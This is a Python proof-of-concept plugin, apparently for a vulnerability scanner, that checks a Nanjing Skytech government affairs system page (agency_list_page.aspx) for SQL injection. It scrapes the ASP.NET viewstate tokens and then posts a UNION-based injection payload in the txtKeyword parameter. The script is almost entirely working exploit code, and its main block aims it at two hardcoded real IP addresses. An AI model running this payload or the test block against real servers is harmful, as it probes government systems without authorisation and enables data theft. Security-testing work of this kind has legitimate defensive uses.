#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 南京擎天政务系统SQL注入(二)
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2015-0100237
description:
    webpages/agency_list_page.aspx parameter:txtKeyword
    stacked queries, UNION query
    这个写一块儿确实有难度,不要喷
'''

import time
import re

def assign(service, arg):
    if service == 'skytech':
        return True, arg

def audit(arg):
    url = arg + 'webpages/agency_list_page.aspx'
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    #获取viewstate等
    code, head, res, err, _ = curl.curl2(url)
    if code != 200:
        return False
    m = re.search(r'id="__VIEWSTATE"\s*value="([a-zA-Z0-9+/=]*)"',res)
    #print res
    if not m:
        viewstate = ''
    else:
        viewstate = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__EVENTVALIDATION"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        eventvalidation = ''
    else:
        eventvalidation = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__VIEWSTATEGENERATOR"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        viewstategenerator = ''
    else:
        viewstategenerator = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    #构造post表单
    payload = 'test%27+UNION+ALL+SELECT+NULL%2CCHAR%2887%29%2BCHAR%28116%29%2BCHAR%2870%29%2BCHAR%2897%29%2BCHAR%2866%29%2BCHAR%2899%29%2C+NULL%2C+NULL%2C+NULL--'
    post = '__EVENTTARGET=Btn_Search&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&Ctr_bTime=&Ctr_eTime=&txtKeyword={payload}&ddlArticleSort=&dg%3A_ctl19%3AJumpList=%E7%AC%AC1%E9%A1%B5'.format(
        viewstate = viewstate,
        viewstategenerator = viewstategenerator,
        eventvalidation = eventvalidation,
        payload = payload
    )
    code, head, res, err, _ = curl.curl2(url, post=post, header=content_type, referer=url)
    #print code, res
    if (code == 200) and ('WtFaBc' in res):
        security_hole('SQL Injection: ' + url + ' Parameter:txtKeyword')
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('skytech', 'http://58.222.202.135:81/')[1])
    audit(assign('skytech', 'http://61.178.185.50/mqweb/')[1])